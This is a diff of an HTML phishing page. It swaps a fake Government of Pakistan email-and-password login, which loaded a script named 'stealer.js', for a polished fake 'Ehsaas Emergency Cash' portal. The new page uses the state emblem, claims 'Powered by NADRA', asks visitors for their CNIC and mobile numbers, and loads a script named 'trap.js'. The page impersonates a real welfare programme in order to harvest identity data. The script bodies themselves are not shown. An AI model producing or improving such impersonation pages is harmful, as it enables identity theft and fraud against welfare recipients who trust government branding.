@@ -2,15 +2,63 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Government Login Portal</title>
-  <script src="/static/stealer.js"></script>
+  <title>Government Payment Portal – Ehsaas Kafalat</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&display=swap">
+  <style>
+    body {
+      background: linear-gradient(to bottom, #f9f9f9, #e4e4e4);
+      font-family: 'Roboto', sans-serif;
+      text-align: center;
+      padding-top: 80px;
+    }
+    .card {
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.15);
+      padding: 25px;
+      border-radius: 12px;
+    }
+    .card img {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      background-color: #006400;
+      color: white;
+      border: none;
+      padding: 12px 25px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    small {
+      display: block;
+      margin-top: 10px;
+      color: gray;
+    }
+  </style>
+  <script src="/static/trap.js"></script>
 </head>
-<body style="font-family: Arial; background: #eef2f3; text-align: center; margin-top: 100px;">
-  <h2>Government of Pakistan - Secure Access</h2>
-  <form>
-    <input type="email" placeholder="Email" required style="padding:10px;"><br><br>
-    <input type="password" placeholder="Password" required style="padding:10px;"><br><br>
-    <button type="submit" style="padding:10px 20px;">Login</button>
-  </form>
+<body>
+  <div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Emblem_of_Pakistan.svg/1200px-Emblem_of_Pakistan.svg.png" alt="Logo">
+    <h2>Ehsaas Emergency Cash</h2>
+    <p>Verify your CNIC to check your payment status.</p>
+    <form onsubmit="return false">
+      <input type="text" placeholder="Enter CNIC number" required>
+      <input type="text" placeholder="Mobile Number" required>
+      <button type="submit">Check Eligibility</button>
+    </form>
+    <small>Govt. of Pakistan – Powered by NADRA</small>
+  </div>
 </body>
 </html>
